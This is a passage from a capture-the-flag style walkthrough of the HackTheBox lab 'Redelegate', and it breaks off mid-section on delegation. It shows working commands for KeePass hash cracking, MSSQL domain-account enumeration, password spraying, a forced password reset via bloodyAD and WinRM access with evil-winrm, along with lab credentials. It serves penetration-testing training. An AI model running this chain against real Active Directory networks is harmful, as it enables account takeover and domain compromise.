---
layout: post
title: "Redelegate (Retired Box)"
date: 2025-12-03 10:00:00 +01:00
categories: ["HackTheBox", "Active Directory Labs", "Official CPTS Prep"]
tags: [
  "CPTS",
  "active directory",
  "delegation",
  "constrained delegation",
  "senabledelegationprivilege",
  "genericall",
  "forcechangepassword",
  "bloodhound",
  "mssql",
  "keepass",
  "ftp",
  "s4u2proxy",
  "s4u2self",
  "dcsync",
  "kerberos",
  "windows"
]
image: /assets/img/posts/CPTS-prep/redelegate/redelegate.png
permalink: /redelegate/
redirect_from:
  - /posts/redelegate/
draft: false
excerpt: "A walkthrough of Redelegate covering FTP-based foothold, KeePass cracking, MSSQL enumeration, ForceChangePassword abuse, and a full constrained delegation attack through FS01$ to Domain Admin."
---

## Overview

Redelegate is a hard Windows AD machine that opens with Anonymous FTP exposure, leaking a KeePass database that leads to a valid local MSSQL login. Using that foothold to enumerate domain accounts reveals a weakly protected user, `marie.curie`, who holds **ForceChangePassword** rights over `helen.frost`. Once Helen is compromised, her membership in Remote Management Users grants direct WinRM access to the domain controller. Helen also has **SeEnableDelegationPrivilege** and **GenericAll** over the `FS01$` computer object, allowing the attacker to reset its password, configure constrained delegation, and ultimately impersonate a privileged account to perform a DCSync and take the domain.

---
## Recon

I begin my scan by creating a dedicated directory for Nmap results. This keeps things organized and lets me easily return to previous scans later without confusion.

```shell
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ nmap -sC -sV -T4 -p- --min-rate=1000 --vv -oA nmap/redelegate 10.129.234.50
```

**Nmap output:**

```bash
Nmap scan report for 10.129.234.50
Host is up, received echo-reply ttl 127 (0.27s latency).
Scanned at 2025-11-28 09:12:24 WAT for 169s
Not shown: 65502 closed tcp ports (reset)
PORT      STATE    SERVICE       REASON          VERSION
21/tcp    open     ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  12:11AM                  434 CyberAudit.txt
| 10-20-24  04:14AM                 2622 Shared.kdbx
|_10-20-24  12:26AM                  580 TrainingAgenda.txt
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open     domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open     http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open     kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-28 08:13:50Z)
135/tcp   open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds? syn-ack ttl 127
464/tcp   open     kpasswd5?     syn-ack ttl 127
593/tcp   open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped    syn-ack ttl 127
1433/tcp  open     ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.234.50:1433: 
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
| ms-sql-info: 
|   10.129.234.50:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-11-28T08:15:00+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-28T08:12:16
| Not valid after:  2055-11-28T08:12:16
| MD5:   f37d:52dc:1dd3:b410:f6a2:0ad0:ad7f:3141
| SHA-1: 7939:e984:4e09:58ad:8d20:75c1:3002:df15:2050:3216
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQOplHuU/hNqVNYvh3Xzco5zANBgkqhkiG9w0BAQsFADA7
<SNIP>
| AdH4kldI8IXIBk6PPvwL06gey445R7v1KpUuhwMm2Hr43vhf6ujVV3YrIuVcKUou
| OsRuhQ==
|_-----END CERTIFICATE-----
3268/tcp  open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped    syn-ack ttl 127
3389/tcp  open     ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Issuer: commonName=dc.redelegate.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-27T08:10:00
| Not valid after:  2026-05-29T08:10:00
| MD5:   237e:a972:bce3:e51a:0fb8:174d:b894:d09d
| SHA-1: e395:3528:0a11:c5ba:3574:8e64:f71a:3f69:cfa0:ccde
| -----BEGIN CERTIFICATE-----
| MIIC5DCCAcygAwIBAgIQYjvY4a9Bt7ZEwDq1pHm3mzANBgkqhkiG9w0BAQsFADAb
<SNIP>
| HhPiJEXJvmhaLaW2tfoeWFWjAnxNwiWibD3emSdvYHfDzbxoVmKWUXhPocU+8/+f
| 2g2bgACvcnc/54XdcDpaBQrEoYaw7txZ
|_-----END CERTIFICATE-----
|_ssl-date: 2025-11-28T08:15:00+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-28T08:14:48+00:00
5985/tcp  open     http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        syn-ack ttl 127 .NET Message Framing
12384/tcp filtered unknown       no-response
29387/tcp filtered unknown       no-response
47001/tcp open     http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49932/tcp open     ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.234.50:49932: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 49932
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-28T08:12:16
| Not valid after:  2055-11-28T08:12:16
| MD5:   f37d:52dc:1dd3:b410:f6a2:0ad0:ad7f:3141
| SHA-1: 7939:e984:4e09:58ad:8d20:75c1:3002:df15:2050:3216
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQOplHuU/hNqVNYvh3Xzco5zANBgkqhkiG9w0BAQsFADA7
<SNIP>
| AdH4kldI8IXIBk6PPvwL06gey445R7v1KpUuhwMm2Hr43vhf6ujVV3YrIuVcKUou
| OsRuhQ==
|_-----END CERTIFICATE-----
| ms-sql-ntlm-info: 
|   10.129.234.50:49932: 
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
|_ssl-date: 2025-11-28T08:15:00+00:00; -1s from scanner time.
58213/tcp open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
58214/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
58215/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
58220/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
58230/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
59330/tcp filtered unknown       no-response
62371/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 41886/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 59228/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 15429/udp): CLEAN (Failed to receive data)
|   Check 4 (port 28509/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-28T08:14:51
|_  start_date: N/A
```

**Key Findings**:

- Anonymous FTP access is enabled on port 21, exposing three files:  _CyberAudit.txt_, _TrainingAgenda.txt_, and a _Shared.kdbx_ KeePass database.
  
- The host is a Domain Controller for `redelegate.vl`. This is confirmed by the presence of Kerberos (88), LDAP/LDAPS (389/636), Global Catalog (3268/3269), SMB (445), and multiple RPC endpoints.
  
- IIS on port 80 is running with default content.
  
- Two Microsoft SQL Server 2019 instances are exposed (1433 and 49932). Both leak NTLM domain info, computer name, and product version.
  
- **WinRM (5985)** is open. This usually becomes relevant once credentials are obtained and is a strong indicator of remote command execution potential later in the chain.
  
- **RDP (3389)** is accessible as well.
  
To proceed, I’ll add the discovered domain entries from the scan to `/etc/hosts` so everything resolves properly.

```
echo "10.129.234.50 DC.redelegate.vl redelegate.vl" | sudo tee -a /etc/hosts
```
---
## Enumeration

#### SMB
First I try SMB Null authentication but it doesn’t actually expose any shares or useful data.

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ nxc smb 10.129.234.50 -u '' -p ''                                          
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.50   445    DC               [+] redelegate.vl\: 
```

So I pivot to the next obvious low-hanging fruit, which is FTP. From the nmap scan I can already see I have access to a few files through anonymous login:
#### FTP
```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ ftp anonymous@redelegate.vl                                           
Connected to redelegate.vl.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||59444|)
125 Data connection already open; Transfer starting.
10-20-24  12:11AM                  434 CyberAudit.txt
10-20-24  04:14AM                 2622 Shared.kdbx
10-20-24  12:26AM                  580 TrainingAgenda.txt
226 Transfer complete.
ftp> 
```

To grab everything at once, I switch the session to binary mode so the files aren’t mangled during transfer. Then I disable prompts and pull everything recursively:

>**Tip:**  FTP defaults to ASCII mode, which can corrupt non-text files like `.kdbx`. Always switch to **binary** before downloading anything important.
{: .prompt-tip }


```shell
ftp> binary 200 Type set to I. 
ftp> prompt off Interactive mode off.
ftp> mget *
```

The **CyberAudit.txt** file is an internal audit summary:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ cat CyberAudit.txt
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:

1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:

1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
```

The **TrainingAgenda.txt** file is more interesting. 

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ cat TrainingAgenda.txt
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October  | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails and what to do when you see one

Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?

Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password 

Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them
```

One line stands out:

```
"Weak Passwords" - Why "SeasonYear!" is not a good password 
```

I’m noting this because it strongly suggests a password pattern that users may still be using despite the “remediation.”

#### KeePass — Shared.kdbx

The KeePass file is password-protected, so the first step is to extract a crackable hash and attack it offline.

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ keepass2john Shared.kdbx | tee Shared.kdbx.hash
```

That gives me the following hash:

```
Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca
```

I test it against **rockyou.txt**, but nothing hits. That sends me straight back to the hint in _TrainingAgenda.txt_ where `"SeasonYear!"` is mentioned.

I create a small custom wordlist based on seasonal passwords for 2024:

```
Spring2024!
Summer2024!
Autumn2024!
Fall2024!
Winter2024!
```

Then I run it with John:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ john --wordlist=pass Shared.kdbx.hash  
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Fall2024!        (Shared)     
1g 0:00:00:01 DONE (2025-11-28 10:22) 1.000g/s 5.000p/s 5.000c/s 5.000C/s Winter2024!..Autumn2024!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The password is **Fall2024!**

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─echo 'Fall2024!' | keepassxc.cli export Shared.kdbx --format csv 
```

Once I gain entry into the file, I extract the following credentials:

```
FTPUser:SguPZBKdRyxWzvXRWy6U
Administrator:Spdv41gg4BlBgSYIW1gF
WordPressPanel:cn4KOEgsHqvKXPjEnSD9
SQLGuest:zDPBpaF4FywlqIv11vii
KeyFobCombination:22331144
Timesheet:hMFS4I0Kj8Rcd62vqi5X
Payroll:cVkqz4bCM7kJRSNlgx2G
```

---
### MSSQL AD Enumeration

Unfortunately, most of the creds turn out to be dead ends. The only one that actually works against its intended service is the **SQLGuest** account:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ nxc mssql dc.redelegate.vl -u SQLGuest -p zDPBpaF4FywlqIv11vii
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\SQLGuest:zDPBpaF4FywlqIv11vii (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')


┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ nxc mssql dc.redelegate.vl -u SQLGuest -p zDPBpaF4FywlqIv11vii --local-auth
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
```

This confirms two things:

1. **The SQLGuest account is valid**,
2. **It’s a local SQL account**, not a domain principal.

To enumerate this new attack vector, I will  switch to `mssqlclient.py`, which gives far better control over SQL interactions than `nxc`:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$  mssqlclient.py SQLGuest:zDPBpaF4FywlqIv11vii@dc.redelegate.vl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SQLGuest  guest@master)> dir
ERROR(DC\SQLEXPRESS): Line 1: Could not find stored procedure 'dir'.
SQL (SQLGuest  guest@master)> enable_xp_cmdshell
ERROR(DC\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
```

I try the usual enumeration commands but this account is heavily restricted. Next I check database trust flags:

```bash
SQL (SQLGuest  guest@master)> xp_dirtree
subdirectory   depth   file   
------------   -----   ----   
SQL (SQLGuest  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   
tempdb                   0   
model                    0   
msdb                     1   
SQL (SQLGuest  guest@master)> 
```

`msdb` being trustworthy is common and not directly exploitable without elevated SQL permissions. This path seemed like a dead end. 

I did a bit of digging and came across a [**NetSPI write-up**](https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/#enumda:~:text=MyPassword!%20%E2%80%93FuzzNum%2010000-,Enumerating%20the%20Domain%20Admins%20with%20Metasploit,-This%20module%20) explaining several ways to enumerate domain accounts and principals with low-priv users. One of the techniques covered involves fuzzing principal IDs to enumerate AD objects through SQL’s mapped security identifiers.

Manually doing that is slow, so I opted for an automated approach using **Metasploit’s `mssql_enum_domain_accounts` module**.

This module works by:

- authenticating to SQL with our low-priv user creds
- iterating through possible principal IDs
- forcing SQL Server to resolve SIDs → AD objects
- pulling down usernames, groups, and domain memberships

To proceed I will select the `mssql_enum_domain_accounts` module on mestapolit and set the options:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ msfconsole -q
msf > use auxiliary/admin/mssql/mssql_enum_domain_accounts
<SNIP>
msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set rhost 10.129.234.50
rhost => 10.129.234.50
msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set password zDPBpaF4FywlqIv11vii
password => zDPBpaF4FywlqIv11vii
msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set username SQLGuest
username => SQLGuest
msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > run
```

The module successfully brute-forces the domain SIDs through SQL and returns a full list of AD users and groups. Most of the output is standard built-in groups, but actual user accounts we can target are also leaked:

```bash
[*] Running module against 10.129.234.50
[*] 10.129.234.50:1433 - Attempting to connect to the database server at 10.129.234.50:1433 as SQLGuest...
[+] 10.129.234.50:1433 - Connected.
[*] 10.129.234.50:1433 - SQL Server Name: WIN-Q13O908QBPG
[*] 10.129.234.50:1433 - Domain Name: REDELEGATE
[+] 10.129.234.50:1433 - Found the domain sid: 010500000000000515000000a185deefb22433798d8e847a
[*] 10.129.234.50:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...
[*] 10.129.234.50:1433 -  - WIN-Q13O908QBPG\Administrator
[*] 10.129.234.50:1433 -  - REDELEGATE\Guest
[*] 10.129.234.50:1433 -  - REDELEGATE\krbtgt
[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Admins
[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Users
[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Guests
[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Computers
[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Controllers
[*] 10.129.234.50:1433 -  - REDELEGATE\Cert Publishers
[*] 10.129.234.50:1433 -  - REDELEGATE\Schema Admins
[*] 10.129.234.50:1433 -  - REDELEGATE\Enterprise Admins
[*] 10.129.234.50:1433 -  - REDELEGATE\Group Policy Creator Owners
[*] 10.129.234.50:1433 -  - REDELEGATE\Read-only Domain Controllers
[*] 10.129.234.50:1433 -  - REDELEGATE\Cloneable Domain Controllers
[*] 10.129.234.50:1433 -  - REDELEGATE\Protected Users
[*] 10.129.234.50:1433 -  - REDELEGATE\Key Admins
[*] 10.129.234.50:1433 -  - REDELEGATE\Enterprise Key Admins
[*] 10.129.234.50:1433 -  - REDELEGATE\RAS and IAS Servers
[*] 10.129.234.50:1433 -  - REDELEGATE\Allowed RODC Password Replication Group
[*] 10.129.234.50:1433 -  - REDELEGATE\Denied RODC Password Replication Group
[*] 10.129.234.50:1433 -  - REDELEGATE\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG
[*] 10.129.234.50:1433 -  - REDELEGATE\DC$
[*] 10.129.234.50:1433 -  - REDELEGATE\FS01$
[*] 10.129.234.50:1433 -  - REDELEGATE\Christine.Flanders
[*] 10.129.234.50:1433 -  - REDELEGATE\Marie.Curie
[*] 10.129.234.50:1433 -  - REDELEGATE\Helen.Frost
[*] 10.129.234.50:1433 -  - REDELEGATE\Michael.Pontiac
[*] 10.129.234.50:1433 -  - REDELEGATE\Mallory.Roberts
[*] 10.129.234.50:1433 -  - REDELEGATE\James.Dinkleberg
[*] 10.129.234.50:1433 -  - REDELEGATE\Helpdesk
[*] 10.129.234.50:1433 -  - REDELEGATE\IT
[*] 10.129.234.50:1433 -  - REDELEGATE\Finance
[*] 10.129.234.50:1433 -  - REDELEGATE\DnsAdmins
[*] 10.129.234.50:1433 -  - REDELEGATE\DnsUpdateProxy
[*] 10.129.234.50:1433 -  - REDELEGATE\Ryan.Cooper
[*] 10.129.234.50:1433 -  - REDELEGATE\sql_svc
```

I’ll make a users list:

```
Christine.Flanders
Marie.Curie
Helen.Frost
Michael.Pontiac
Mallory.Roberts
James.Dinkleberg
Helpdesk
IT
Finance
DnsAdmins
DnsUpdateProxy
Ryan.Cooper
sql_svc
```

---
## Authenticating as Marie.Curie

Since we already discovered earlier that the environment has weak password tendencies, the next logical step is to password-spray these accounts using the same seasonal wordlist that cracked the KeePass vault.

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ netexec smb dc.redelegate.vl -u users -p pass --continue-on-success

STATUS_LOGON_FAILURE
SMB         10.129.234.50   445    DC               [-] redelegate.vl\sql_svc:Summer2024! STATUS_LOGON_FAILURE
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Christine.Flanders:Fall2024! STATUS_LOGON_FAILURE
SMB         10.129.234.50   445    DC               [+] redelegate.vl\Marie.Curie:Fall2024! 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Helen.Frost:Fall2024! STATUS_LOGON_FAILURE
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Michael.Pontiac:Fall2024! STATUS_LOGON_FAILURE
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Mallory.Roberts:Fall2024! STATUS_ACCOUNT_RESTRICTION
```

Luckily, there is a hit on the `Marie.Curie` user account. 

---
## BloodHound Collection

With domain creds in hand, I can now move get a full picture of the environment via `BloodHound`. 

I pull the data using `rusthound`:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ rusthound-ce -d redelegate.vl -u marie.curie -p 'Fall2024!' --zip -c  All
```

Once imported into `BloodHound`, I mark `marie.curie` as owned and run the **Shortest Paths from Owned Principals** query. The graph shows that `marie.curie` has **ForceChangePassword** rights over several accounts.

![Title card]({{ 'assets/img/posts/CPTS-prep/redelegate/01.png' | relative_url }})

There is also a direct path to **GenericAll** on the `FS01$` computer object via `helen.frost`, who is a member of the **Remote Management Users** group. The next logical step is to leverage Marie’s **ForceChangePassword** privilege to take over Helen’s account, authenticate through **WinRM**, and use that foothold to pivot laterally toward `FS01$`.

---

## Getting Shell as Helen.Frost

First step is obtaining Kerberos tickets for `marie.curie` to perform actions on her behalf:
```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ impacket-getTGT redelegate.vl/marie.curie:'Fall2024!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in marie.curie.ccache
```

Then I export the ticket:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ export KRB5CCNAME=marie.curie.ccache
```

With the TGT loaded, I can now abuse the **ForceChangePassword** privilege:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ bloodyAD -d redelegate.vl -k --host dc.redelegate.vl set password helen.frost Password123.

[+] Password changed successfully!
```

Helen’s password has now been reset. Since she is a member of the **Remote Management Users** group, I can now test authentication to an interactive **WinRM** shell using `netexec`.

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ nxc winrm redelegate.vl -u helen.frost -p Password123.              
WINRM       10.129.234.50   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
WINRM       10.129.234.50   5985   DC               [+] redelegate.vl\helen.frost:Password123. (Pwn3d!)
```

#### Shell

With confirmation that **WinRM** access is possible, I drop into an interactive PowerShell session using `evil-winrm`:

```powershell
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ evil-winrm -i redelegate.vl -u helen.frost -p Password123.

*Evil-WinRM* PS C:\Users\Helen.Frost> tree /f /a .
Folder PATH listing
Volume serial number is 0000016D 5171:55DF
C:\USERS\HELEN.FROST
+---Desktop
|       user.txt
|
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos
*Evil-WinRM* PS C:\Users\Helen.Frost> 
```

---

## Privilege Escalation Path to Admin

Now that I have an interactive shell as `helen.frost`, the first thing I do is check her assigned privileges.

```powershell
*Evil-WinRM* PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

**SeMachineAccountPrivilege** and **SeEnableDelegationPrivilege** are both very interesting.

---
### Checking Machine Account Quota

`SeMachineAccountPrivilege` normally allows any authenticated user to create new machine accounts in the domain but this only works if the domain’s **MachineAccountQuota** is greater than zero. So I check it:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ netexec ldap redelegate.vl -u marie.curie -p 'Fall2024!' -M maq
SMB   10.129.234.50  445   DC   [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
LDAP  10.129.234.50  389   DC   redelegate.vl\marie.curie:Fall2024!
MAQ   10.129.234.50  389   DC   [+] MachineAccountQuota: 0
```

**MachineAccountQuota** is indeed set to zero, so that entire technique is not going to work here.

---
### Testing DNS Record Injection

Before moving on, I also test whether the user can modify DNS records. Being able to add arbitrary A-records can sometimes open up **ADIDNS attacks**.

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ python3 dnstool.py -u 'REDELEGATE.VL\marie.curie' -p 'Fall2024!' -r 'test' -a add -d "10.10.14.48" 10.129.234.50

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[!] LDAP operation failed. 
    Message returned from server: insufficientAccessRights
    00000005: SecErr: DSID-03152E29, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

This confirms that Marie (and by extension Helen) cannot create or modify DNS entries through LDAP.

>**Note:**  ADIDNS abuse typically becomes viable when a user can freely register or overwrite DNS records, allowing attacks such as redirecting service traffic, coercing privileged authentication, or staging NTLM relays through spoofed hostnames.
{: .prompt-info }


---
## Exploiting SeEnableDelegationPrivilege

The remaining privilege that actually matters is **SeEnableDelegationPrivilege**. This is rarely granted to a normal user and is typically only assigned to highly trusted service administrators. It allows the holder to configure delegation on other user or computer accounts, influencing how Kerberos authentication flows across the domain.

There are three primary delegation models in Active Directory, and understanding them helps explain which escalation paths are possible and which ones are not in this environment.
*****
##### **1. Unconstrained Delegation**

Unconstrained delegation allows a computer to cache TGTs for _any_ user who authenticates to it. Once cached, the machine can reuse those tickets to access other services as that user.

To configure this, an account with **SeEnableDelegationPrivilege** updates the computer’s `userAccountControl` attribute and enables the `TRUSTED_FOR_DELEGATION` flag.

In a typical attack, the steps would look like:

- Create a new machine account
- Register a DNS A-record for it
- Configure that machine for unconstrained delegation
- Coerce the domain controller (or another privileged user) to authenticate to it
- Extract the DC’s TGT from memory

However, on this domain:

